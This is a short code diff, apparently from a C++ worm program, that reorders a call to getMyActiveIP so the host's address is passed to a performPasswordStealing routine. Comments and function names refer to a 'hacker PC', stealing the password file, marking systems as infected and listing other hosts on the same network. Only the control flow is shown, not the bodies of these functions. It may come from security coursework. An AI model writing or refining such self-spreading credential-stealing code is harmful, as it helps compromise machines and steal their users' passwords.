@@ -722,6 +722,9 @@ int main (int argc, const char **argv) {
     Iface thisHost;
     vector<string> allHosts;
 
+    // Get the IP address of this system
+    thisHost = getMyActiveIP();
+
     // Check to see if run from master/hacker PC
     // argc start at 1 and going up
     if(argc < 2)
@@ -743,7 +746,7 @@ int main (int argc, const char **argv) {
             string fromHost = argv[1];
             printf("Stealing password file ...\n");
             // Perform malicious
-            if (performPasswordStealing()  < 0) {
+            if (performPasswordStealing(thisHost)  < 0) {
                 perror("Not able to steal password\n")
                 exit(-1);
             }
@@ -753,9 +756,6 @@ int main (int argc, const char **argv) {
             markSystemAsInfected(fromHost);
         }
     }
-
-    // Get the IP address of this system
-    thisHost = getMyActiveIP();
 
     // Get all the hosts from the network
     allHosts = getHostsOnTheSameNetwork(thisHost);
